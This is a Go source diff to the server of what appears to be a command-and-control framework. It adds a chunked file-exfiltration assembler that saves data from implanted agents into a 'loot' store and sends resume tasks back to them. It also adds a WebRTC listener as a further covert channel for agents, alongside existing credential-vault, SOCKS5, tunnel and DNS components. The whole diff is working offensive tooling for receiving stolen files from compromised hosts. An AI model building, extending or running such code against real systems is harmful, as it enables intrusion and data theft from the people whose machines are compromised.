@@ -63,6 +63,7 @@ type Server struct {
 	socks5      *SOCKS5Manager
 	vault       *CredentialVault
 	files       *FileManager
+	exfil       *ExfilAssembler
 	portFwds    *PortFwdManager
 	tunnels     *TunnelManager
 	moduleStore *module.Store
@@ -236,6 +237,20 @@ func New(cfg *config.Config, database *db.DB) *Server {
 
 // Start begins listening on all configured transports.
 func (s *Server) Start() error {
+	// Exfil chunked-upload assembler. Resume requests are delivered to
+	// the agent as tasks (__exfil_resume) through the normal task queue.
+	// CreateTask BLOCKS until the task result arrives, so it must never
+	// run on the session read loop: the reader would stop consuming the
+	// very chunks the resume is supposed to receive (deadlock until the
+	// 300s task timeout). Fire it on its own goroutine instead.
+	s.exfil = NewExfilAssembler("loot", s.files, func(sessionID, transferID string, offset int64) {
+		go func() {
+			if _, err := s.CreateTask(sessionID, fmt.Sprintf("__exfil_resume %s %d", transferID, offset), 300); err != nil {
+				log.Printf("[EXFIL] cannot enqueue resume for %s: %v", transferID, err)
+			}
+		}()
+	})
+
 	// Configure TLS. Fail hard instead of silently falling back to
 	// plaintext when the operator asked for TLS but no certificate is
 	// available.
@@ -379,6 +394,20 @@ func (s *Server) Start() error {
 			s.listeners = append(s.listeners, dnsListener)
 			s.wg.Add(1)
 			go s.acceptLoop(dnsListener, "dns")
+		}
+	}
+
+	// Start WebRTC listener (signaling HTTP endpoint + data channels)
+	if s.cfg.Transport.WebRTCPort > 0 {
+		webrtcAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.WebRTCPort)
+		webrtcListener, err := transport.NewWebRTCListener(webrtcAddr, s.tlsConfig)
+		if err != nil {
+			log.Printf("[WEBRTC] Warning: failed to start: %v", err)
+		} else {
+			s.listeners = append(s.listeners, webrtcListener)
+			s.wg.Add(1)
+			go s.acceptLoop(webrtcListener, "webrtc")
+			log.Printf("[WEBRTC] Signaling listening on %s", webrtcAddr)
 		}
 	}
 
@@ -889,6 +918,10 @@ func (s *Server) handleMessageLoop(sess *session.Session) {
 				// Check for tunnel results
 				if strings.HasPrefix(result.Output, "tunnel_") {
 					s.tunnels.HandleTunnelResult(result)
+				}
+				// Chunked file exfiltration (assembly + resume)
+				if s.exfil != nil {
+					s.exfil.HandleOutput(sess.ID, result.Output)
 				}
 				sess.ResolveTask(result.TaskId, result)
 
